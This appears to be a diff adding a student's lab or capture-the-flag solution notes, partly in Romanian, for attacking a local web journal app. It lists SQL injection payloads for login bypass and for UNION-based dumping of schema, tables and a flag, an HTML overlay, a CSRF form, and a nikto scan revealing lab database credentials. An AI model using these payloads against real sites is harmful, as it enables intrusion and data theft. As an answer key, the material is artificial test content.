@@ -1,0 +1,28 @@
+1.
+dupa start, insert 
+' OR 1=1 -- 
+la username si te logheaza
+
+2.
+' UNION SELECT 1,2,3, GROUP_CONCAT(schema_name) FROM information_schema.schemata --  => table_schema=journalapp
+' UNION SELECT 1,2,3, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='journalapp' --  => table_name=entries, flags, users
+' UNION SELECT 1,2,3, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flags' --  => columns=id, name, flag
+' UNION SELECT 1,2,3, GROUP_CONCAT(flag) FROM flags -- => Flag{adv4nc3dsequeel}
+
+3.
+<div style="position: absolute; top: -600px;left:250px;">
+	<img src="http://localhost:8080/images/muzzle.png">
+</div>
+
+4.
+<form action="http://localhost:8080/journal/post" method="post">
+  <input type="hidden" id="message" name="message" value="You submitted on the wrong site! HAHAHAHAHA xD">
+  <input type="submit" value="Send">
+</form>
+
+trb pus ca argument la send
+
+5.
+nikto -h http://localhost:8080/ -> server.js
+user     : 'guest',
+password : 'secretpasswordlab08-1337',
